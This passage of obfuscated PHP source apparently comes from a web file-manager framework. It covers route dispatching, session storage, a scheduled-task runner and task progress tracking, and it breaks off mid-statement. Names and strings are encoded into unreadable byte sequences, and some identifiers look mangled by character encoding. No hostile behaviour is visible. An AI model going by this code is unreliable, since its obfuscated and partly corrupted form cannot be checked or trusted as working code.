(in_array($Ô£àöÆÎ, self::$routes)) { $½…²·ö‹ = array_keys(self::$routes, $Ô£àöÆÎ); foreach ($½…²·ö‹ as $ ‰½©è«) { if (self::$methods[$ ‰½©è«] == $¦é“ê¤Ö || self::$methods[$ ‰½©è«] == $æ®Ä§Œ[1734] || in_array($¦é“ê¤Ö, self::$maps[$ ‰½©è«])) { $Æ­®ÀÍ = !0; if (!is_object(self::$callbacks[$ ‰½©è«])) { $‰õØî˜Ş = explode($æ®Ä§Œ[8], self::$callbacks[$ ‰½©è«]); $‡ÑèØÌ« = end($‰õØî˜Ş); $ìÃ¸Ğåâ = explode($æ®Ä§Œ[1310], $‡ÑèØÌ«); $Œ«‹ê« = new $ìÃ¸Ğåâ[0](); $Œ«‹ê«->{$ìÃ¸Ğåâ[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$ ‰½©è«]); if (self::$halts) { return; } } } } } else { $éöÌ—Æ† = 0; foreach (self::$routes as $ ‰½©è«) { if (strpos($ ‰½©è«, $æ®Ä§Œ[4]) !== !1) { $ ‰½©è« = str_replace($˜î³, $ñÑµ«æË, $ ‰½©è«); } if (preg_match($æ®Ä§Œ[1735] . $ ‰½©è« . $æ®Ä§Œ[1736], $Ô£àöÆÎ, $¯ÌÆ­)) { if (self::$methods[$éöÌ—Æ†] == $¦é“ê¤Ö || self::$methods[$éöÌ—Æ†] == $æ®Ä§Œ[1734] || !empty(self::$maps[$éöÌ—Æ†]) && in_array($¦é“ê¤Ö, self::$maps[$éöÌ—Æ†])) { $Æ­®ÀÍ = !0; array_shift($¯ÌÆ­); if (!is_object(self::$callbacks[$éöÌ—Æ†])) { $‰õØî˜Ş = explode($æ®Ä§Œ[8], self::$callbacks[$éöÌ—Æ†]); $‡ÑèØÌ« = end($‰õØî˜Ş); $ìÃ¸Ğåâ = explode($æ®Ä§Œ[1310], $‡ÑèØÌ«); $Œ«‹ê« = new $ìÃ¸Ğåâ[0](); if (!method_exists($Œ«‹ê«, $ìÃ¸Ğåâ[1])) { echo $æ®Ä§Œ[1737]; } else { call_user_func_array(array($Œ«‹ê«, $ìÃ¸Ğåâ[1]), $¯ÌÆ­); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$éöÌ—Æ†], $¯ÌÆ­); if (self::$halts) { return; } } } } $éöÌ—Æ†++; } } if ($Æ­®ÀÍ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $ÔÙˆıŠ =& $_SERVER[´‹ô¯Œ]; header($_SERVER[$ÔÙˆıŠ[1738]] . $ÔÙˆıŠ[1739]); echo $ÔÙˆıŠ[1740]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$æ®Ä§Œ[1733]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $°áõÁ¹ï =& $_SERVER[´‹ô¯Œ]; static $¢Åƒ = false; if ($¢Åƒ) { return $¢Åƒ; } $éÉœ¨ê = $GLOBALS[$°áõÁ¹ï[6]][$°áõÁ¹ï[427]]; self::$sessionTime = $éÉœ¨ê[$°áõÁ¹ï[1741]]; $¶İ²áŞ÷ = isset($GLOBALS[$°áõÁ¹ï[1742]]) ? $GLOBALS[$°áõÁ¹ï[1742]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($¶İ²áŞ÷)) { self::$sessionSign = Cookie::get($¶İ²áŞ÷); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($¶İ²áŞ÷, self::$sessionSign, self::$sessionTime); $¬ÉšìşÃ = $éÉœ¨ê[$°áõÁ¹ï[1743]]; $ñÛÍ¯ˆØ = $éÉœ¨ê[$¬ÉšìşÃ]; $ºŠ‰·ÀÒ = $éÉœ¨ê[$°áõÁ¹ï[919]]; switch ($¬ÉšìşÃ) { case $°áõÁ¹ï[21]: self::$handle = Model($°áõÁ¹ï[920]); break; case $°áõÁ¹ï[921]: self::$handle = new CacheRedis($ñÛÍ¯ˆØ, $ºŠ‰·ÀÒ); break; case $°áõÁ¹ï[922]: self::$handle = new CacheMemcached($ñÛÍ¯ˆØ, $ºŠ‰·ÀÒ); break; case $°áõÁ¹ï[233]: $ñÛÍ¯ˆØ[$°áõÁ¹ï[87]] = $ñÛÍ¯ˆØ[$°áõÁ¹ï[87]] . $°áõÁ¹ï[1744]; self::$handle = new CacheFile($ñÛÍ¯ˆØ, $ºŠ‰·ÀÒ); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $¢Åƒ = new self(); return $¢Åƒ; } public static function getBySign($é‰ÒÒÆŠ) { $ê’÷¶ùÍ = self::$handle->get($é‰ÒÒÆŠ); $ê’÷¶ùÍ = unserialize($ê’÷¶ùÍ); return is_array($ê’÷¶ùÍ) ? $ê’÷¶ùÍ : array(); } public static function setBySign($™÷’µšà, $“ÒŞ‡·€) { CacheLock::lock($™÷’µšà); self::$handle->set($™÷’µšà, serialize($“ÒŞ‡·€), self::$sessionTime); CacheLock::unlock($™÷’µšà); } public static function sign($Ü¯Ïá® = false) { if ($Ü¯Ïá®) { self::$sessionSign = $Ü¯Ïá®; } self::init(); return self::$sessionSign; } public static function set($—»òŞÜ, $Ğ˜—ğÂ = false) { self::init(); if (is_array($—»òŞÜ)) { foreach ($—»òŞÜ as $ü×’üóÅ => $ãÂõ¼Óí) { array_set_value(self::$data, $ü×’üóÅ, $ãÂõ¼Óí); } } else { array_set_value(self::$data, $—»òŞÜ, $Ğ˜—ğÂ); } self::setBySign(self::$sessionSign, self::$data); } public static function get($·‚£°‹ = false) { self::init(); if (!$·‚£°‹) { return self::$data; } return array_get_value(self::$data, $·‚£°‹); } public static function remove($©±¡¸ëƒ) { self::init(); unset(self::$data[$©±¡¸ëƒ]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[´‹ô¯Œ][925])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $İşëñª˜ =& $_SERVER[´‹ô¯Œ]; if (self::valueGet($İşëñª˜[836]) != $İşëñª˜[91]) { return; } if (self::valueGet($İşëñª˜[1745]) == $İşëñª˜[91]) { $ÒÚü±¥è = self::valueGet($İşëñª˜[1746]); if (time() - $ÒÚü±¥è > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($İşëñª˜[1745], $İşëñª˜[91]); self::log($İşëñª˜[1747] . ACTION . $İşëñª˜[1748]); Hook::bind($İşëñª˜[1749], $İşëñª˜[1750]); $½ñÔÜ— = 0; while (!0) { self::cacheClear(); if (self::valueGet($İşëñª˜[836]) != $İşëñª˜[91]) { self::valueSet($İşëñª˜[1745], $İşëñª˜[231]); self::log($İşëñª˜[1751]); die; } $¥òòüÖ = time(); if ($¥òòüÖ - $½ñÔÜ— >= 60) { self::valueSet(array($İşëñª˜[1745] => $İşëñª˜[91], $İşëñª˜[1746] => $¥òòüÖ)); $½ñÔÜ— = $¥òòüÖ; } if (!file_exists(USER_SYSTEM . $İşëñª˜[1752])) { self::valueSet(array($İşëñª˜[1745] => $İşëñª˜[231], $İşëñª˜[836] => $İşëñª˜[231])); self::log($İşëñª˜[1753]); die; } $Ÿ¶üùó¨ = file_get_contents(BASIC_PATH . $İşëñª˜[1754]); $Ê‘Ó«µ´ = KOD_VERSION . $İşëñª˜[10] . KOD_VERSION_BUILD; $óæœ¾à = match_text($Ÿ¶üùó¨, $İşëñª˜[1755]) . $İşëñª˜[10] . match_text($Ÿ¶üùó¨, $İşëñª˜[1756]); if ($óæœ¾à != $Ê‘Ó«µ´) { self::restart(); self::log("\x73\164\157\160\145\x64\56\x5b\x76\x65\x72\x73\151\157\x6e\40\165\x70\x64\141\164\x65\73{$versionNow}\40\75\x3e\40{$version}\x5d"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $ü¥Æ”· =& $_SERVER[´‹ô¯Œ]; http_close(); $GLOBALS[$ü¥Æ”·[1757]] = 1; $_SERVER[$ü¥Æ”·[1758]] = $ü¥Æ”·[1759]; $_COOKIE = array(); $GLOBALS[$ü¥Æ”·[1760]] = 1; $GLOBALS[$ü¥Æ”·[1761]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $˜ëİğº€ =& $_SERVER[´‹ô¯Œ]; http_close(); self::valueSet($˜ëİğº€[836], $˜ëİğº€[231]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($˜ëİğº€[1745] => $˜ëİğº€[231], $˜ëİğº€[836] => $˜ëİğº€[91])); self::log($˜ëİğº€[1762]); } public static function taskSwitch() { $º¸±â « =& $_SERVER[´‹ô¯Œ]; $œ¬µ×ù = self::valueGet($º¸±â «[836]) == $º¸±â «[91] ? $º¸±â «[231] : $º¸±â «[91]; self::valueSet($º¸±â «[836], $œ¬µ×ù); } public static function shutdownEvent() { $­àµ‚¯Û =& $_SERVER[´‹ô¯Œ]; self::valueSet($­àµ‚¯Û[1745], $­àµ‚¯Û[231]); self::log($­àµ‚¯Û[1763]); } public static function config($‚Êƒ©Š›, $æ¦òï¾¯) { self::valueSet($_SERVER[´‹ô¯Œ][836], $‚Êƒ©Š›); } private static function taskRunAll() { $ùŸ·õ‘ =& $_SERVER[´‹ô¯Œ]; $úÙ¼àê¤ = timeFloat(); $Ù­ÇŒ—Ê = Model($ùŸ·õ‘[1764])->listData(); $“ğ¤ä¥§ = count($Ù­ÇŒ—Ê); for ($úÛÔÕ = 0; $úÛÔÕ < $“ğ¤ä¥§; $úÛÔÕ++) { $Üá”…²Í = $Ù­ÇŒ—Ê[$úÛÔÕ]; if (!$Üá”…²Í[$ùŸ·õ‘[487]] || $Üá”…²Í[$ùŸ·õ‘[1765]] != $ùŸ·õ‘[91]) { continue; } if (!self::taskTimeCheck($Üá”…²Í)) { continue; } self::taskRun($Üá”…²Í); } Hook::trigger($ùŸ·õ‘[1766]); self::taskQueueRun($úÙ¼àê¤); } private static function taskQueueRun($šóÓ‚Û) { $Ûâ¡„½ = 10; while (!0) { $ÜˆˆÖ‚µ = TaskQueue::run(); if ($ÜˆˆÖ‚µ === !1) { break; } if (timeFloat() - $šóÓ‚Û >= $Ûâ¡„½) { break; } } } private static function taskTimeCheck($áÁéÕÀ¤) { $ æÀÌüÕ =& $_SERVER[´‹ô¯Œ]; $Û†ÕÒÆ = json_decode($áÁéÕÀ¤[$ æÀÌüÕ[207]], !0); $¦ã¿Õ×Õ = intval($áÁéÕÀ¤[$ æÀÌüÕ[1746]]); $Öçˆ‡Õø = strtotime($ æÀÌüÕ[1767] . $Û†ÕÒÆ[$ æÀÌüÕ[1768]] . $ æÀÌüÕ[1769]) - strtotime($ æÀÌüÕ[1770]); $´¤â¶öš = time() - strtotime(date($ æÀÌüÕ[1771]) . $ æÀÌüÕ[1772]); $Åê¡ªÃ = $´¤â¶öš >= $Öçˆ‡Õø && $´¤â¶öš <= $Öçˆ‡Õø + 3600; switch ($Û†ÕÒÆ[$ æÀÌüÕ[33]]) { case $ æÀÌüÕ[1773]: if (time() - $¦ã¿Õ×Õ < 3600 * 24 * 30) { return !1; } if ($Û†ÕÒÆ[$ æÀÌüÕ[1773]] == date($ æÀÌüÕ[1774]) && $Åê¡ªÃ) { return !0; } break; case $ æÀÌüÕ[1775]: if (time() - $¦ã¿Õ×Õ < 3600 * 24 * 7) { return !1; } $· öïõÉ = date($ æÀÌüÕ[1776]) == 0 ? 7 : date($ æÀÌüÕ[1776]); if ($Û†ÕÒÆ[$ æÀÌüÕ[1775]] == $· öïõÉ && $Åê¡ªÃ) { return !0; } break; case $ æÀÌüÕ[1768]: if (time() - $¦ã¿Õ×Õ < 3600 * 24) { return !1; } if ($Åê¡ªÃ) { return !0; } break; case $ æÀÌüÕ[1777]: if (time() - $¦ã¿Õ×Õ >= floatval($Û†ÕÒÆ[$ æÀÌüÕ[1777]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $ÉÂèâš° =& $_SERVER[´‹ô¯Œ]; static $Ëà§æšŒ = 0; $î§­ê´¨ = 300; if (!$Ëà§æšŒ) { $Ëà§æšŒ = time(); } if (time() - $Ëà§æšŒ < $î§­ê´¨) { return; } $Ëà§æšŒ = time(); $¯›…• = Model($ÉÂèâš°[591])->db($ÉÂèâš°[12]); if ($¯›…•) { $¯›…•->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($ÉÂèâš°[1778], $ÉÂèâš°[1779]); die; } } public static function taskRun($İ¶Ï³É) { $¹éèı÷ =& $_SERVER[´‹ô¯Œ]; self::log($¹éèı÷[1780] . $İ¶Ï³É[$¹éèı÷[487]] . $¹éèı÷[1781] . $İ¶Ï³É[$¹éèı÷[32]] . $¹éèı÷[1782] . $İ¶Ï³É[$¹éèı÷[1783]]); Model($¹éèı÷[1764])->run($İ¶Ï³É[$¹éèı÷[487]]); $”¨±»óÈ = timeFloat(); $ÎĞåéàÄ = $¹éèı÷[12]; switch ($İ¶Ï³É[$¹éèı÷[33]]) { case $¹éèı÷[385]: $€ÇÚå£ = url_request($İ¶Ï³É[$¹éèı÷[1783]], $¹éèı÷[1520], !1, !1, !1, !1, 10); if ($€ÇÚå£[$¹éèı÷[836]]) { $ÎĞåéàÄ = strlen($€ÇÚå£[$¹éèı÷[1304]]); } break; case $¹éèı÷[1784]: $ÎĞåéàÄ = Hook::apply($İ¶Ï³É[$¹éèı÷[1783]]); default: break; } Model($¹éèı÷[1785])->add(array($¹éèı÷[1786] => $¹éèı÷[12], $¹éèı÷[1787] => $¹éèı÷[231], $¹éèı÷[33] => $¹éèı÷[1788] . $İ¶Ï³É[$¹éèı÷[487]], $¹éèı÷[1789] => json_encode(array($¹éèı÷[32] => $İ¶Ï³É[$¹éèı÷[32]], $¹éèı÷[1790] => timeFloat() - $”¨±»óÈ, $¹éèı÷[371] => $ÎĞåéàÄ)))); $ÌÂĞÀ¶ = $ÎĞåéàÄ ? $¹éèı÷[1791] . $ÎĞåéàÄ : $¹éèı÷[12]; self::log($¹éèı÷[1792] . $İ¶Ï³É[$¹éèı÷[487]] . $¹éèı÷[178] . $ÌÂĞÀ¶); return !0; } public static function valueGet($­Í£×æ³) { $¹àíÆá¨ =& $_SERVER[´‹ô¯Œ]; $Š¯§ğæõ = $¹àíÆá¨[1793]; $’°÷ÔÑœ = Model($¹àíÆá¨[520])->get($­Í£×æ³, $Š¯§ğæõ); if (is_null($’°÷ÔÑœ)) { Model($¹àíÆá¨[520])->set($¹àíÆá¨[836], $¹àíÆá¨[91], $Š¯§ğæõ); Model($¹àíÆá¨[520])->set($¹àíÆá¨[1745], $¹àíÆá¨[231], $Š¯§ğæõ); $’°÷ÔÑœ = Model($¹àíÆá¨[520])->get($­Í£×æ³, $Š¯§ğæõ); } return $’°÷ÔÑœ; } private static function valueSet($ÙÙªšã®, $Ä¤ÆÕÇ– = false) { $Ñ°¹ÏõÙ =& $_SERVER[´‹ô¯Œ]; $ç¼ñÄ’ = $Ñ°¹ÏõÙ[1794]; CacheLock::lock($ç¼ñÄ’); $›…ÑòïÉ = Model($Ñ°¹ÏõÙ[520])->set($ÙÙªšã®, $Ä¤ÆÕÇ–, $Ñ°¹ÏõÙ[1793]); CacheLock::unlock($ç¼ñÄ’); return $›…ÑòïÉ; } protected static function log($ĞÚêä¬§) { write_log($ĞÚêä¬§, $_SERVER[´‹ô¯Œ][1779]); } private static function cacheClear() { $¤µ ä†ø =& $_SERVER[´‹ô¯Œ]; Cache::clearMemory(Model($¤µ ä†ø[520])->cacheKey($¤µ ä†ø[1793])); Cache::clearMemory(Model($¤µ ä†ø[520])->cacheKey($¤µ ä†ø[1795])); Model($¤µ ä†ø[1764])->cacheClear(); self::closeDatabase(); } } goto Aö‘‡ùê÷; Aö‘‡ùê÷: class Task { const STATYS_STOP = "\x73\164\x6f\160"; const STATYS_RUNNING = "\x72\165\x6e\156\151\156\x67"; const STATYS_KILL = "\x6b\151\x6c\154"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($ŞëÆš©, $Ã¸ö¶¹ = '', $¿âµ®Ùı = 0, $¾ßïóÂê = '') { $šğç«ëª =& $_SERVER[´‹ô¯Œ]; if (self::get($ŞëÆš©)) { return; } $this->task = array($šğç«ëª[487] => $ŞëÆš©, $šğç«ëª[1796] => USER_ID, $šğç«ëª[1684] => $¾ßïóÂê, $šğç«ëª[538] => $šğç«ëª[12], $šğç«ëª[33] => $Ã¸ö¶¹, $šğç«ëª[1157] => $šğç«ëª[12], $šğç«ëª[1155] => $¿âµ®Ùı, $šğç«ëª[1797] => 0, $šğç«ëª[1798] => 0, $šğç«ëª[1799] => 0, $šğç«ëª[1800] => timeFloat(), $šğç«ëª[1801] => 0, $šğç«ëª[1802] => 0, $šğç«ëª[1803] => 0, $šğç«ëª[1804] => 0, $šğç«ëª[836] => $šğç«ëª[1745]); $GLOBALS[$šğç«ëª[1805]] = 1; Hook::bind($šğç«ëª[1749], array($this, $šğç«ëª[1806])); Hook::bind($šğç«ëª[1807], array($this, $šğç«ëª[1808])); $this->startAfter(); Hook::trigger($šğç«ëª[1809], $this->task); $this->task[$šğç«ëª[1802]] = timeFloat(); } public function end($¸·÷·Ó = '') { $ÂÄÉô¹‚ =& $_SERVER[´‹ô¯Œ]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$ÂÄÉô¹‚[1802]]) { self::valueSet($this->task[$ÂÄÉô¹‚[487]], !1); } $this->isEnd = !0; if ($¸·÷·Ó) { $this->task[$ÂÄÉô¹‚[538]] = $¸·÷·Ó; } self::log($ÂÄÉô¹‚[1810] . $this->task[$ÂÄÉô¹‚[487]] . $ÂÄÉô¹‚[1811] . sprintf($ÂÄÉô¹‚[943], timeFloat() - $this->task[$ÂÄÉô¹‚[1800]]) . $ÂÄÉô¹‚[1812]); Hook::unbind($ÂÄÉô¹‚[1749], array($this, $ÂÄÉô¹‚[1806])); Hook::unbind($ÂÄÉô¹‚[1807], array($this, $ÂÄÉô¹‚[1808])); $this->endAfter(); $×óõ™î¥ = $this->task; $this->task = !1; Hook::trigger($ÂÄÉô¹‚[1813], $×óõ™î¥); } public function update($‰ƒ×ğŒö = 0, $úë»ı‹Ş = false) { $æî‹ö¬‡ =& $_SERVER[´‹ô¯Œ]; $³ÂÔüÓô =& $this->task; if (!$³ÂÔüÓô) { return; } $³ÂÔüÓô[$æî‹ö¬‡[1797]] += $‰ƒ×ğŒö; $³ÂÔüÓô[$æî‹ö¬‡[1801]] = timeFloat(); if ($³ÂÔüÓô[$æî‹ö¬‡[1155]]) { if ($³ÂÔüÓô[$æî‹ö¬‡[1155]] < $³ÂÔüÓô[$æî‹ö¬‡[1797]]) { $³ÂÔüÓô[$æî‹ö¬‡[1155]] = $³ÂÔüÓô[$æî‹ö¬‡[1797]]; } $¦Ùëâ‡Õ = timeFloat() - $³ÂÔüÓô[$æî‹ö¬‡[1800]] - $³ÂÔüÓô[$æî‹ö¬‡[1803]]; if ($¦Ùëâ‡Õ <= 0) { $¦Ùëâ‡Õ = 0.001; } $³ÂÔüÓô[$æî‹ö¬‡[1798]] = $³ÂÔüÓô[$æî‹ö¬‡[1797]] / $³ÂÔüÓô[$æî‹ö¬‡[1155]]; $³ÂÔüÓô[$æî‹ö¬‡[1799]] = $³ÂÔüÓô[$æî‹ö¬‡[1797]] / $¦Ùëâ‡Õ; if ($³ÂÔüÓô[$æî‹ö¬‡[1798]] > 0) { $³ÂÔüÓô[$æî‹ö¬‡[1804]] = $¦Ùëâ‡Õ * (1 - $³ÂÔüÓô[$æî‹ö¬‡[1798]]) / $³ÂÔüÓô[$æî‹ö¬‡[1798]]; } $³ÂÔüÓô[$æî‹ö¬‡[1804]] = $³ÂÔüÓô[$æî‹ö¬‡[1804]] <= 0 ? 0 : $³ÂÔüÓô[$æî‹ö¬‡[1804]]; } $this->updateAfter(); $¸ÃåÍ”ò = 0.2; if (timeFloat() - $³ÂÔüÓô[$æî‹ö¬‡[1802]] < $¸ÃåÍ”ò && !$úë»ı‹Ş) { return; } $²˜ÛÙ = self::get($³ÂÔüÓô[$æî‹ö¬‡[487]]); $ÆéŒ¶ñ– = $²˜ÛÙ[$æî‹ö¬‡[836]]; if ($ÆéŒ¶ñ– == self::STATYS_KILL) { $ˆüŠßØ = array($æî‹ö¬‡[1814] => LNG($æî‹ö¬‡[1815]), $æî‹ö¬‡[1314] => !1); Cache::set($æî‹ö¬‡[1816] . $this->task[$æî‹ö¬‡[487]], $ˆüŠßØ, 30); $this->onKill(); $this->end(); die; } else { if ($ÆéŒ¶ñ– == self::STATYS_STOP) { $Ëµö°²Î = 2; $²˜ÛÙ[$æî‹ö¬‡[1803]] += $Ëµö°²Î; self::valueSet($³ÂÔüÓô[$æî‹ö¬‡[487]], $²˜ÛÙ); sleep($Ëµö°²Î); $this->update(); return; } } $³ÂÔüÓô[$æî‹ö¬‡[836]] = $ÆéŒ¶ñ– ? $ÆéŒ¶ñ– : $³ÂÔüÓô[$æî‹ö¬‡[836]]; $³ÂÔüÓô[$æî‹ö¬‡[1803]] = $²˜ÛÙ[$æî‹ö¬‡[1803]] ? $²˜ÛÙ[$æî‹ö¬‡[1803]] : 0; $³ÂÔüÓô[$æî‹ö¬‡[1802]] = timeFloat(); Hook::trigger($æî‹ö¬‡[1817], $³ÂÔüÓô); self::valueSet($³ÂÔüÓô[$æî‹ö¬‡[487]], $³ÂÔüÓô); } public function onKillSet($À²™Ó¢, $®Şöø– = array()) { $this->onKillCall = array($À²™Ó¢, $®Şöø–); } public function onKill() { $ı·’È‡¢ =& $_SERVER[´‹ô¯Œ]; self::log($ı·’È‡¢[1810] . $this->task[$ı·’È‡¢[487]] . $ı·’È‡¢[1818]); Hook::trigger($ı·’È‡¢[1819], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($èûƒÎ³Õ) { $Óò€æÜê =& $_SERVER[´‹ô¯Œ]; Cache::set($Óò€æÜê[1816] . $this->task[$Óò€æÜê[487]], $èûƒÎ³Õ, 60); if (!is_array($èûƒÎ³Õ) || !$èûƒÎ³Õ[$Óò€æÜê[1314]]) { self::log($Óò€æÜê[1820] . json_encode($èûƒÎ³Õ)); } return $èûƒÎ³Õ; } public static function get($àÍ¾ˆ³²) { $²‰Õ©Â¶ =& $_SERVER[´‹ô¯Œ]; $®’ÛÌ = self::valueGet($àÍ¾ˆ³²); if (is_array($®’ÛÌ) && $®’ÛÌ[$²‰Õ©Â¶[1821]]) { $àäª³Õˆ = ActionApply($®’ÛÌ[$²‰Õ©Â¶[1821]], array($®’ÛÌ)); $®’ÛÌ = is_array($àäª³Õˆ) ? $àäª³Õˆ : $®’ÛÌ; } return $®’ÛÌ; } public static function listData() { $ºº»üôú = self::valueGet(); return array_sort_by($ºº»üôú, $_SERVER[´‹ô¯Œ][1800], !0); } public static function kill($Á÷ÂıÔ) { return self::changeStatus($Á÷ÂıÔ, self::STATYS_KILL); } public static function stop($é”â‰Ôí) { return self::changeStatus($é”â‰Ôí, self::STATYS_STOP); } public static function restart($Š¨ÁÌŠÀ) { return self::changeStatus($Š¨ÁÌŠÀ, self::STATYS_RUNNING); } public static function killAll() { $ê÷ÈÈæ =& $_SERVER[´‹ô¯Œ]; $òÒÂÌïÎ = self::listData(); foreach ($òÒÂÌïÎ as $ß·çè¢„) { self::kill($ß·çè¢„[$ê÷ÈÈæ[487]]); } sleep(2); foreach ($òÒÂÌïÎ as $ß·çè¢„) { self::valueSet($ß·çè¢„[$ê÷ÈÈæ[487]], !1); } } private static function changeStatus($‡÷úÕ¥×, $ÏúìäŸ§) { $ßøì¡Ğ =& $_SERVER[´‹ô¯Œ]; $‡‰Ùê©Í = self::valueGet($‡÷úÕ¥×); if (!$‡‰Ùê©Í) { return !1; } $‡‰Ùê©Í[$ßøì¡Ğ[836]] = $ÏúìäŸ§; self::valueSet($‡÷úÕ¥×, $‡‰Ùê©Í); self::log($ßøì¡Ğ[1822] . $‡‰Ùê©Í[$ßøì¡Ğ[487]] . $ßøì¡Ğ[1823] . $ÏúìäŸ§); return !0; } public static function valueGet($Îù É• = false) { $ñ«„òÅÇ =& $_SERVER[´‹ô¯Œ]; if ($Îù É•) { $Ëíîâ„û = Model($ñ«„òÅÇ[532])->where(array($ñ«„òÅÇ[97] => $Îù É•, $ñ«„òÅÇ[33] => $ñ«„òÅÇ[1164]))->find(); return $Ëíîâ„û ? json_decode($Ëíîâ„û[$ñ«„òÅÇ[453]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($¼Ûó©è = false) { $”£À¤» =& $_SERVER[´‹ô¯Œ]; $âˆãÇ†ö = array($”£À¤»[33] => $”£À¤»[1164]); if ($¼Ûó©è) { $âˆãÇ†ö[$”£À¤»[1796]] = $¼Ûó©è; } $çê íã = Model($”£À¤»[532])->where($âˆãÇ†ö)->select(); $çê íã = $çê íã ? $çê íã : array(); foreach ($çê íã as $ª¬Ğ³ëĞ => $§‘Á§Á) { $çê íã[$ª¬Ğ³ëĞ] = json_decode($§‘Á§Á[$”£À¤»[453]], !0); } return $çê íã; } public static function valueSet($àÂê£ß, $íüÃù³İ) { $ŞíëÍÚö =& $_SERVER[´‹ô¯Œ]; if (!$íüÃù³İ) { return Model($ŞíëÍÚö[532])->where(array($ŞíëÍÚö[97] => $àÂê£ß, $ŞíëÍÚö[33] => $ŞíëÍÚö[1164]))->delete(); } $âã¡±¬ = json_encode($íüÃù³İ); if (!$âã¡±¬) { ob_start(); var_dump($íüÃù³İ); $õÅÎÔ´í = ob_get_clean(); self::log($ŞíëÍÚö[1824] . json_encode_force($õÅÎÔ´í)); } if (!$àÂê£ß || !$íüÃù³İ[$ŞíëÍÚö[487]]) { return !1; } $Õ¥Œµ¥¶ = array($ŞíëÍÚö[33] => $ŞíëÍÚö[1164], $ŞíëÍÚö[1796] => USER_ID, $ŞíëÍÚö[97] => $àÂê£ß, $ŞíëÍÚö[453] => $âã¡±¬); $Úœ›•Œë = $ŞíëÍÚö[1825]; CacheLock::lock($Úœ›•Œë); Model($ŞíëÍÚö[532])->add($Õ¥Œµ¥¶, array(), !0); CacheLock::unlock($Úœ›•Œë); } public static function log($…‘ôÜ³) { if (!GLOBAL_DEBUG) { return; } write_log($…‘ôÜ³, $_SERVER[´‹ô¯Œ][1826]); } } class TaskFileTransfer extends Task { protected function startAfter() { $µ½ŒÊê€ =& $_SERVER[´‹ô¯Œ]; $ò…ÚÏ¿‡ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($µ½ŒÊê€[1827], array($this, $µ½ŒÊê€[1828])); Hook::bind($µ½ŒÊê€[1325], array($this, $µ½ŒÊê€[1829])); Hook::bind($µ½ŒÊê€[1830], array($this, $µ½ŒÊê€[1831])); Hook::bind($µ½ŒÊê€[685], array($this, $µ½ŒÊê€[1832])); Hook::bind($µ½ŒÊê€[686], array($this, $µ½ŒÊê€[1833])); Hook::bind($µ½ŒÊê€[692], array($this, $µ½ŒÊê€[1834])); Hook::bind($µ½ŒÊê€[693], array($this, $µ½ŒÊê€[1835])); Hook::bind($µ½ŒÊê€[688], array($this, $µ½ŒÊê€[1836])); Hook::bind($µ½ŒÊê€[690], array($this, $µ½ŒÊê€[1837])); Hook::bind($µ½ŒÊê€[654], array($this, $µ½ŒÊê€[1838])); Hook::bind($µ½ŒÊê€[651], array($this, $µ½ŒÊê€[1838])); Hook::bind($µ½ŒÊê€[656], array($this, $µ½ŒÊê€[1838])); Hook::bind($µ½ŒÊê€[658], array($this, $µ½ŒÊê€[1838])); Hook::bind($µ½ŒÊê€[660], array($this, $µ½ŒÊê€[1838])); Hook::bind($µ½ŒÊê€[1839], array($this, $µ½ŒÊê€[1840])); Hook::bind($µ½ŒÊê€[676], array($this, $µ½ŒÊê€[1841])); $this->sourceModelCopyFlag = !1; Hook::bind($µ½ŒÊê€[1842], array($this, $µ½ŒÊê€[1843])); Hook::bind($µ½ŒÊê€[1844], array($this, $µ½ŒÊê€[1845])); Hook::bind($µ½ŒÊê€[1846], array($this, $µ½ŒÊê€[1847])); $ò…ÚÏ¿‡[$µ½ŒÊê€[1848]] = LNG($µ½ŒÊê€[1849]); $ò…ÚÏ¿‡[$µ½ŒÊê€[1850]] = 0; $ò…ÚÏ¿‡[$µ½ŒÊê€[1851]] = 0; $ò…ÚÏ¿‡[$µ½ŒÊê€[1157]] = $µ½ŒÊê€[12]; $ò…ÚÏ¿‡[$µ½ŒÊê€[1852]] = $µ½ŒÊê€[12]; $ò…ÚÏ¿‡[$µ½ŒÊê€[1853]] = 0; $ò…ÚÏ¿‡[$µ½ŒÊê€[1854]] = 0; $ò…ÚÏ¿‡[$µ½ŒÊê€[1855]] = 0; if (!$ò…ÚÏ¿‡[$µ½ŒÊê€[1684]]) { $ò…ÚÏ¿‡[$µ½ŒÊê€[1684]] = LNG($µ½ŒÊê€[1856]); } } protected function endAfter() { $†ĞÑÉœ =& $_SERVER[´‹ô¯Œ]; Hook::unbind($†ĞÑÉœ[1827], array($this, $†ĞÑÉœ[1828])); Hook::unbind($†ĞÑÉœ[1325], array($this, $†ĞÑÉœ[1829])); Hook::unbind($†ĞÑÉœ[1830], array($this, $†ĞÑÉœ[1831])); Hook::unbind($†ĞÑÉœ[685], array($this, 